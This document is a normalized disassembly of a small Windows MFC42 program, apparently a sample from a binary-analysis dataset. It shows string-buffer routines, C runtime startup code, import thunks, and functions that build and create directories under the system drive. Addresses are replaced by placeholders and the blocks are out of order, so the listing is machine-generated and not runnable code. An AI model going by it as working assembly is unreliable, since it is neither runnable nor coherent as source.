mov [ ecx + 0x14 ] eax
mov [ ecx + 0xd468 ] eax
mov [ ecx + 0xd46c ] 0x20000
mov [ ecx + 0xd470 ] eax
mov [ ecx + 0xd474 ] eax
mov [ ecx + 0x12828 ] al
mov [ ecx + 0x12840 ] eax
mov [ ecx + 0x12844 ] eax
mov [ ecx + 0x12848 ] eax
mov edi [ ecx + 0x12834 ]
mov ebp [ ecx + 0x12830 ]
mov esi edi
cmp esi edi
je r-xdata
mov edx [ ecx + 0x12834 ]
mov [ ecx + 0x12834 ] ebp
pop edi
mov [ esp + 0x8 ] edx
mov [ ecx + 0x1283c ] eax
mov [ ecx + 0x1284c ] eax
mov [ ecx + 0x12850 ] 0x80
mov [ ecx + 0x12854 ] eax
mov [ ecx + 0x12858 ] eax
pop ebp
mov dl [ esi ]
mov [ ebp ] dl
inc ebp
inc esi
cmp esi edi
jne r-xdata
sub_402400
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esp + 0x8 ] eax
call Ordinal_MFC42_825
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
pop ecx
retn
sub_402430
sub esp 0x8
push ebx
mov ebx ecx
push ebp
mov ebp [ esp + 0x18 ]
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
sub ecx eax
push esi
cmp ecx ebp
push edi
jae r-xdata
mov esi [ esp + 0x1c ]
mov edx eax
sub edx esi
cmp edx ebp
jae r-xdata
mov edx [ ebx + 0x4 ]
test edx edx
je r-xdata
test ebp ebp
jbe r-xdata
cmp esi eax
lea edi [ esi + ebp ]
je r-xdata
mov ecx ebp
mov ecx eax
sub ecx edx
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
mov ecx eax
mov edi eax
sub ecx ebp
cmp ecx eax
je r-xdata
mov ecx [ ebx + 0x8 ]
mov edi [ esp + 0x24 ]
mov eax esi
sub eax ecx
add eax ebp
je r-xdata
mov ecx edi
sub ecx ebp
sub eax edx
xor eax eax
jmp r-xdata
test edx edx
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax ecx
sub eax ebp
cmp esi eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebx + 0x8 ]
mov eax esi
cmp esi ecx
je r-xdata
test ecx ecx
je r-xdata
inc edi
inc ecx
cmp ecx eax
jne r-xdata
mov dl [ ecx ]
mov ebp [ esp + 0x20 ]
mov [ edi ] dl
push eax
call Ordinal_MFC42_823
mov edi [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
mov ecx eax
mov eax [ ebx + 0x4 ]
add esp 0x4
cmp eax edi
je r-xdata
xor eax eax
add eax ecx
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
lea ecx [ esi + ebp ]
mov eax esi
cmp esi ecx
je r-xdata
mov dl [ eax - 0x1 ]
dec eax
dec ecx
cmp eax esi
mov [ ecx ] dl
jne r-xdata
inc edi
inc ecx
cmp ecx eax
jne r-xdata
mov dl [ ecx ]
mov ebp [ esp + 0x20 ]
mov [ edi ] dl
add [ ebx + 0x8 ] ebp
mov dl [ edi ]
mov [ eax ] dl
inc eax
cmp eax ecx
jne r-xdata
inc ecx
dec eax
jne r-xdata
mov dl [ edi ]
mov ebp [ esp + 0x20 ]
mov [ ecx ] dl
test edi edi
je r-xdata
test ebp ebp
mov eax ecx
jbe r-xdata
test ecx ecx
je r-xdata
mov esi [ esp + 0x24 ]
mov ebp [ esp + 0x20 ]
jmp r-xdata
mov esi [ ebx + 0x8 ]
lea edx [ ecx + ebp ]
cmp edi esi
je r-xdata
mov esi ebp
mov ebp [ esp + 0x24 ]
inc ecx
inc eax
cmp eax edi
jne r-xdata
mov dl [ eax ]
mov ebp [ esp + 0x20 ]
mov [ ecx ] dl
mov dl [ esi ]
mov [ eax ] dl
inc eax
cmp eax ecx
jne r-xdata
mov ebp [ esp + 0x20 ]
mov eax [ ebx + 0x4 ]
push eax
mov [ esp + 0x24 ] eax
call Ordinal_MFC42_825
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
add esp 0x4
lea ecx [ edx + eax ]
mov [ ebx + 0xc ] ecx
mov ecx [ ebx + 0x4 ]
test ecx ecx
jne r-xdata
mov eax edx
sub eax ecx
sub eax ebp
add eax edi
inc eax
dec esi
jne r-xdata
mov dl [ ebp ]
mov [ eax ] dl
mov eax [ ebx + 0x8 ]
pop edi
sub eax ecx
pop esi
add eax edx
mov [ ebx + 0x4 ] edx
add eax ebp
pop ebp
mov [ ebx + 0x8 ] eax
pop ebx
add esp 0x8
retn 0xc
xor eax eax
pop edi
mov eax edx
pop esi
add eax ebp
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] eax
pop ebp
pop ebx
add esp 0x8
retn 0xc
inc edx
inc eax
cmp eax esi
jne r-xdata
mov cl [ eax ]
mov ebp [ esp + 0x20 ]
mov [ edx ] cl
test eax eax
je r-xdata
mov ebp [ esp + 0x20 ]
test edx edx
je r-xdata
sub_402600
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp ecx esi
je r-xdata
pop esi
retn 0xc
test eax eax
je r-xdata
inc eax
inc ecx
cmp ecx esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
sub_402630
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn 0xc
push esi
mov esi [ esp + 0x10 ]
mov ecx eax
mov eax [ esp + 0x8 ]
inc eax
dec ecx
jne r-xdata
mov dl [ esi ]
mov [ eax ] dl
test eax eax
je r-xdata
pop esi
sub_402680
push 0xffffffff
push sub_402fb7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push rw-data
lea ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_537
lea eax [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
push eax
call sub_402920
add esp 0x4
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_800
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov ecx [ esp + 0x4 ]
mov esi [ CreateDirectoryA@IAT ]
push 0x0
push ecx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov edx [ esp + 0x4 ]
push 0x0
push edx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0xc ] 0x1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
sub_402760
push 0xffffffff
push sub_402ff7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push rw-data
lea ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_537
lea eax [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
push eax
call sub_402920
add esp 0x4
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_800
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov ecx [ esp + 0x4 ]
mov esi [ CreateDirectoryA@IAT ]
push 0x0
push ecx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov edx [ esp + 0x4 ]
push 0x0
push edx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0xc ] 0x1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
sub_402840
push 0xffffffff
push sub_403037
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push rw-data
lea ecx [ esp + 0x8 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_537
lea eax [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
push eax
call sub_402920
add esp 0x4
push eax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0x2
call Ordinal_MFC42_858
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_800
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov ecx [ esp + 0x4 ]
mov esi [ CreateDirectoryA@IAT ]
push 0x0
push ecx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov edx [ esp + 0x4 ]
push 0x0
push edx
call esi
push rw-data
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_941
mov esi [ esp + 0x20 ]
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0xc ] 0x1
lea ecx [ esp + 0x4 ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x10 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
sub_402920
push 0xffffffff
push sub_403075
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50c
push ebx
push esi
push edi
xor ebx ebx
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
call Ordinal_MFC42_537
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x115 ]
mov [ esp + 0x114 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x319 ]
mov [ esp + 0x318 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x419 ]
mov [ esp + 0x418 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x219 ]
mov [ esp + 0x218 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x114 ]
push 0x104
push eax
mov [ esp + 0x528 ] 0x1
call [ GetSystemDirectoryA@IAT ]
lea ecx [ esp + 0x218 ]
lea edx [ esp + 0x418 ]
push ecx
lea eax [ esp + 0x31c ]
push edx
lea ecx [ esp + 0x1c ]
push eax
lea edx [ esp + 0x120 ]
push ecx
push edx
call [ _splitpath@IAT ]
add esp 0x14
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0xc ]
push eax
call Ordinal_MFC42_860
push rw-data
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_941
mov ecx [ esp + 0xc ]
mov esi [ CreateDirectoryA@IAT ]
push ebx
push ecx
call esi
push rw-data
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_941
mov edx [ esp + 0xc ]
push ebx
push edx
call esi
lea eax [ esp + 0xc ]
mov esi [ esp + 0x528 ]
push eax
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x10 ] 0x1
lea ecx [ esp + 0xc ]
mov [ esp + 0x520 ] bl
call Ordinal_MFC42_800
mov ecx [ esp + 0x518 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x518
retn
sub_402c40
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402e1d
cmp [ rw-data ] ebx
jne r-xdata
call sub_402e08
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402e1a
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_402e2a
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_402e42
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401000
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_401010
mov eax r--data
retn
sub_401020
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401040
push esi
mov esi ecx
call sub_401060
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401060
jmp Ordinal_MFC42_815
sub_401070
call sub_401080
jmp sub_401090
sub_401080
mov ecx rw-data
jmp sub_401020
sub_401090
push sub_4010a0
call sub_402c22
pop ecx
retn
sub_4010a0
mov ecx rw-data
jmp sub_401060
sub_401930
retn
sub_401940
retn 0x4
sub_4019e0
push esi
mov esi ecx
call sub_401a00
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_402660
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
mov ecx [ esp + 0x8 ]
mov dl [ ecx ]
mov [ eax ] dl
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_4129
jmp [ Ordinal_MFC42_4129@IAT ]
Ordinal_MFC42_5683
jmp [ Ordinal_MFC42_5683@IAT ]
Ordinal_MFC42_1979
jmp [ Ordinal_MFC42_1979@IAT ]
Ordinal_MFC42_6385
jmp [ Ordinal_MFC42_6385@IAT ]
Ordinal_MFC42_665
jmp [ Ordinal_MFC42_665@IAT ]
Ordinal_MFC42_5186
jmp [ Ordinal_MFC42_5186@IAT ]
Ordinal_MFC42_354
jmp [ Ordinal_MFC42_354@IAT ]
Ordinal_MFC42_535
jmp [ Ordinal_MFC42_535@IAT ]
Ordinal_MFC42_939
jmp [ Ordinal_MFC42_939@IAT ]
Ordinal_MFC42_536
jmp [ Ordinal_MFC42_536@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_2915
jmp [ Ordinal_MFC42_2915@IAT ]
Ordinal_MFC42_2919
jmp [ Ordinal_MFC42_2919@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_941
jmp [ Ordinal_MFC42_941@IAT ]
Ordinal_MFC42_860
jmp [ Ordinal_MFC42_860@IAT ]
sub_402bf6
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_402c22
push [ esp + 0x4 ]
call sub_402bf6
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_402c6f
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402e08
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402e1a
xor eax eax
retn
sub_402e1d
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_402e2a
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_402e70
jmp sub_402e70
sub_402e70
push 0x600
push 0x0
call sub_402e42
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_402e90
lea ecx [ ebp - 0x21c ]
jmp Ordinal_MFC42_800
sub_402e9b
lea ecx [ ebp - 0x218 ]
jmp Ordinal_MFC42_800
sub_402ea6
lea ecx [ ebp - 0x218 ]
jmp Ordinal_MFC42_800
sub_402eb1
mov eax r--data
jmp __CxxFrameHandler
sub_402ec0
lea ecx [ ebp - 0x12880 ]
jmp Ordinal_MFC42_800
sub_402ecb
lea ecx [ ebp - 0x12878 ]
jmp Ordinal_MFC42_665
sub_402ed6
lea ecx [ ebp - 0x1287c ]
jmp Ordinal_MFC42_800
sub_402ee1
lea ecx [ ebp - 0x12868 ]
jmp sub_401a00
sub_402eec
mov eax r--data
jmp __CxxFrameHandler
sub_402f00
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_402f08
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_402f10
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_402f27
mov eax r--data
jmp __CxxFrameHandler
sub_402f40
lea ecx [ ebp - 0x78 ]
jmp Ordinal_MFC42_800
sub_402f48
lea ecx [ ebp - 0x74 ]
jmp Ordinal_MFC42_800
sub_402f50
lea ecx [ ebp - 0x74 ]
jmp Ordinal_MFC42_800
sub_402f58
lea ecx [ ebp - 0x70 ]
jmp Ordinal_MFC42_665
sub_402f60
mov eax r--data
jmp __CxxFrameHandler
sub_402f70
mov ecx [ ebp - 0x10 ]
add ecx 0x1282c
jmp sub_402400
sub_402f7e
mov eax r--data
jmp __CxxFrameHandler
sub_402f90
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_402f98
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_402fa0
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_402fb7
mov eax r--data
jmp __CxxFrameHandler
sub_402fd0
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_402fd8
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_402fe0
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_402ff7
mov eax r--data
jmp __CxxFrameHandler
sub_403010
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_403018
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_403020
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_403037
mov eax r--data
jmp __CxxFrameHandler
sub_403050
lea ecx [ ebp - 0x518 ]
jmp Ordinal_MFC42_800
sub_40305b
mov eax [ ebp - 0x514 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_403075
mov eax r--data
jmp __CxxFrameHandler
